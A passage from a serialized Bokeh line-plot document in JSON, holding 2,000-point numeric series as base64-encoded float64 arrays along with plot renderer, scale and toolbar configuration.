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","dtype":"float64","shape":[2000]}},"selected":{"id":"1162","type":"Selection"},"selection_policy":{"id":"1163","type":"UnionRenderers"}},"id":"1136","type":"ColumnDataSource"},{"attributes":{},"id":"1124","type":"SaveTool"},{"attributes":{"overlay":{"id":"1161","type":"BoxAnnotation"}},"id":"1123","type":"BoxZoomTool"},{"attributes":{"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1137","type":"Line"},{"attributes":{},"id":"1125","type":"ResetTool"},{"attributes":{},"id":"1126","type":"HelpTool"},{"attributes":{},"id":"1107","type":"LinearScale"},{"attributes":{"data_source":{"id":"1136","type":"ColumnDataSource"},"glyph":{"id":"1137","type":"Line"},"hover_glyph":null,"muted_glyph":null,"nonselection_glyph":{"id":"1138","type":"Line"},"selection_glyph":null,"view":{"id":"1140","type":"CDSView"}},"id":"1139","type":"GlyphRenderer"},{"attributes":{"callback":null},"id":"1103","type":"DataRange1d"},{"attributes":{"data_source":{"id":"1141","type":"ColumnDataSource"},"glyph":{"id":"1142","type":"Line"},"hover_glyph":null,"muted_glyph":null,"nonselection_glyph":{"id":"1143","type":"Line"},"selection_glyph":null,"view":{"id":"1145","type":"CDSView"}},"id":"1144","type":"GlyphRenderer"},{"attributes":{"callback":null,"data":{"x":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271,272,273,274,275,276,277,278,279,280,281,282,283,284,285,286,287,288,289,290,291,292,293,294,295,296,297,298,299,300,301,302,303,304,305,306,307,308,309,310,311,312,313,314,315,316,317,318,319,320,321,322,323,324,325,326,327,328,329,330,331,332,333,334,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349,350,351,352,353,354,355,356,357,358,359,360,361,362,363,364,365,366,367,368,369,370,371,372,373,374,375,376,377,378,379,380,381,382,383,384,385,386,387,388,389,390,391,392,393,394,395,396,397,398,399,400,401,402,403,404,405,406,407,408,409,410,411,412,413,414,415,416,417,418,419,420,421,422,423,424,425,426,427,428,429,430,431,432,433,434,435,436,437,438,439,440,441,442,443,444,445,446,447,448,449,450,451,452,453,454,455,456,457,458,459,460,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,476,477,478,479,480,481,482,483,484,485,486,487,488,489,490,491,492,493,494,495,496,497,498,499,500,501,502,503,504,505,506,507,508,509,510,511,512,513,514,515,516,517,518,519,520,521,522,523,524,525,526,527,528,529,530,531,532,533,534,535,536,537,538,539,540,541,542,543,544,545,546,547,548,549,550,551,552,553,554,555,556,557,558,559,560,561,562,563,564,565,566,567,568,569,570,571,572,573,574,575,576,577,578,579,580,581,582,583,584,585,586,587,588,589,590,591,592,593,594,595,596,597,598,599,600,601,602,603,604,605,606,607,608,609,610,611,612,613,614,615,616,617,618,619,620,621,622,623,624,625,626,627,628,629,630,631,632,633,634,635,636,637,638,639,640,641,642,643,644,645,646,647,648,649,650,651,652,653,654,655,656,657,658,659,660,661,662,663,664,665,666,667,668,669,670,671,672,673,674,675,676,677,678,679,680,681,682,683,684,685,686,687,688,689,690,691,692,693,694,695,696,697,698,699,700,701,702,703,704,705,706,707,708,709,710,711,712,713,714,715,716,717,718,719,720,721,722,723,724,725,726,727,728,729,730,731,732,733,734,735,736,737,738,739,740,741,742,743,744,745,746,747,748,749,750,751,752,753,754,755,756,757,758,759,760,761,762,763,764,765,766,767,768,769,770,771,772,773,774,775,776,777,778,779,780,781,782,783,784,785,786,787,788,789,790,791,792,793,794,795,796,797,798,799,800,801,802,803,804,805,806,807,808,809,810,811,812,813,814,815,816,817,818,819,820,821,822,823,824,825,826,827,828,829,830,831,832,833,834,835,836,837,838,839,840,841,842,843,844,845,846,847,848,849,850,851,852,853,854,855,856,857,858,859,860,861,862,863,864,865,866,867,868,869,870,871,872,873,874,875,876,877,878,879,880,881,882,883,884,885,886,887,888,889,890,891,892,893,894,895,896,897,898,899,900,901,902,903,904,905,906,907,908,909,910,911,912,913,914,915,916,917,918,919,920,921,922,923,924,925,926,927,928,929,930,931,932,933,934,935,936,937,938,939,940,941,942,943,944,945,946,947,948,949,950,951,952,953,954,955,956,957,958,959,960,961,962,963,964,965,966,967,968,969,970,971,972,973,974,975,976,977,978,979,980,981,982,983,984,985,986,987,988,989,990,991,992,993,994,995,996,997,998,999,1000,1001,1002,1003,1004,1005,1006,1007,1008,1009,1010,1011,1012,1013,1014,1015,1016,1017,1018,1019,1020,1021,1022,1023,1024,1025,1026,1027,1028,1029,1030,1031,1032,1033,1034,1035,1036,1037,1038,1039,1040,1041,1042,1043,1044,1045,1046,1047,1048,1049,1050,1051,1052,1053,1054,1055,1056,1057,1058,1059,1060,1061,1062,1063,1064,1065,1066,1067,1068,1069,1070,1071,1072,1073,1074,1075,1076,1077,1078,1079,1080,1081,1082,1083,1084,1085,1086,1087,1088,1089,1090,1091,1092,1093,1094,1095,1096,1097,1098,1099,1100,1101,1102,1103,1104,1105,1106,1107,1108,1109,1110,1111,1112,1113,1114,1115,1116,1117,1118,1119,1120,1121,1122,1123,1124,1125,1126,1127,1128,1129,1130,1131,1132,1133,1134,1135,1136,1137,1138,1139,1140,1141,1142,1143,1144,1145,1146,1147,1148,1149,1150,1151,1152,1153,1154,1155,1156,1157,1158,1159,1160,1161,1162,1163,1164,1165,1166,1167,1168,1169,1170,1171,1172,1173,1174,1175,1176,1177,1178,1179,1180,1181,1182,1183,1184,1185,1186,1187,1188,1189,1190,1191,1192,1193,1194,1195,1196,1197,1198,1199,1200,1201,1202,1203,1204,1205,1206,1207,1208,1209,1210,1211,1212,1213,1214,1215,1216,1217,1218,1219,1220,1221,1222,1223,1224,1225,1226,1227,1228,1229,1230,1231,1232,1233,1234,1235,1236,1237,1238,1239,1240,1241,1242,1243,1244,1245,1246,1247,1248,1249,1250,1251,1252,1253,1254,1255,1256,1257,1258,1259,1260,1261,1262,1263,1264,1265,1266,1267,1268,1269,1270,1271,1272,1273,1274,1275,1276,1277,1278,1279,1280,1281,1282,1283,1284,1285,1286,1287,1288,1289,1290,1291,1292,1293,1294,1295,1296,1297,1298,1299,1300,1301,1302,1303,1304,1305,1306,1307,1308,1309,1310,1311,1312,1313,1314,1315,1316,1317,1318,1319,1320,1321,1322,1323,1324,1325,1326,1327,1328,1329,1330,1331,1332,1333,1334,1335,1336,1337,1338,1339,1340,1341,1342,1343,1344,1345,1346,1347,1348,1349,1350,1351,1352,1353,1354,1355,1356,1357,1358,1359,1360,1361,1362,1363,1364,1365,1366,1367,1368,1369,1370,1371,1372,1373,1374,1375,1376,1377,1378,1379,1380,1381,1382,1383,1384,1385,1386,1387,1388,1389,1390,1391,1392,1393,1394,1395,1396,1397,1398,1399,1400,1401,1402,1403,1404,1405,1406,1407,1408,1409,1410,1411,1412,1413,1414,1415,1416,1417,1418,1419,1420,1421,1422,1423,1424,1425,1426,1427,1428,1429,1430,1431,1432,1433,1434,1435,1436,1437,1438,1439,1440,1441,1442,1443,1444,1445,1446,1447,1448,1449,1450,1451,1452,1453,1454,1455,1456,1457,1458,1459,1460,1461,1462,1463,1464,1465,1466,1467,1468,1469,1470,1471,1472,1473,1474,1475,1476,1477,1478,1479,1480,1481,1482,1483,1484,1485,1486,1487,1488,1489,1490,1491,1492,1493,1494,1495,1496,1497,1498,1499,1500,1501,1502,1503,1504,1505,1506,1507,1508,1509,1510,1511,1512,1513,1514,1515,1516,1517,1518,1519,1520,1521,1522,1523,1524,1525,1526,1527,1528,1529,1530,1531,1532,1533,1534,1535,1536,1537,1538,1539,1540,1541,1542,1543,1544,1545,1546,1547,1548,1549,1550,1551,1552,1553,1554,1555,1556,1557,1558,1559,1560,1561,1562,1563,1564,1565,1566,1567,1568,1569,1570,1571,1572,1573,1574,1575,1576,1577,1578,1579,1580,1581,1582,1583,1584,1585,1586,1587,1588,1589,1590,1591,1592,1593,1594,1595,1596,1597,1598,1599,1600,1601,1602,1603,1604,1605,1606,1607,1608,1609,1610,1611,1612,1613,1614,1615,1616,1617,1618,1619,1620,1621,1622,1623,1624,1625,1626,1627,1628,1629,1630,1631,1632,1633,1634,1635,1636,1637,1638,1639,1640,1641,1642,1643,1644,1645,1646,1647,1648,1649,1650,1651,1652,1653,1654,1655,1656,1657,1658,1659,1660,1661,1662,1663,1664,1665,1666,1667,1668,1669,1670,1671,1672,1673,1674,1675,1676,1677,1678,1679,1680,1681,1682,1683,1684,1685,1686,1687,1688,1689,1690,1691,1692,1693,1694,1695,1696,1697,1698,1699,1700,1701,1702,1703,1704,1705,1706,1707,1708,1709,1710,1711,1712,1713,1714,1715,1716,1717,1718,1719,1720,1721,1722,1723,1724,1725,1726,1727,1728,1729,1730,1731,1732,1733,1734,1735,1736,1737,1738,1739,1740,1741,1742,1743,1744,1745,1746,1747,1748,1749,1750,1751,1752,1753,1754,1755,1756,1757,1758,1759,1760,1761,1762,1763,1764,1765,1766,1767,1768,1769,1770,1771,1772,1773,1774,1775,1776,1777,1778,1779,1780,1781,1782,1783,1784,1785,1786,1787,1788,1789,1790,1791,1792,1793,1794,1795,1796,1797,1798,1799,1800,1801,1802,1803,1804,1805,1806,1807,1808,1809,1810,1811,1812,1813,1814,1815,1816,1817,1818,1819,1820,1821,1822,1823,1824,1825,1826,1827,1828,1829,1830,1831,1832,1833,1834,1835,1836,1837,1838,1839,1840,1841,1842,1843,1844,1845,1846,1847,1848,1849,1850,1851,1852,1853,1854,1855,1856,1857,1858,1859,1860,1861,1862,1863,1864,1865,1866,1867,1868,1869,1870,1871,1872,1873,1874,1875,1876,1877,1878,1879,1880,1881,1882,1883,1884,1885,1886,1887,1888,1889,1890,1891,1892,1893,1894,1895,1896,1897,1898,1899,1900,1901,1902,1903,1904,1905,1906,1907,1908,1909,1910,1911,1912,1913,1914,1915,1916,1917,1918,1919,1920,1921,1922,1923,1924,1925,1926,1927,1928,1929,1930,1931,1932,1933,1934,1935,1936,1937,1938,1939,1940,1941,1942,1943,1944,1945,1946,1947,1948,1949,1950,1951,1952,1953,1954,1955,1956,1957,1958,1959,1960,1961,1962,1963,1964,1965,1966,1967,1968,1969,1970,1971,1972,1973,1974,1975,1976,1977,1978,1979,1980,1981,1982,1983,1984,1985,1986,1987,1988,1989,1990,1991,1992,1993,1994,1995,1996,1997,1998,1999],"y":{"__ndarray__":"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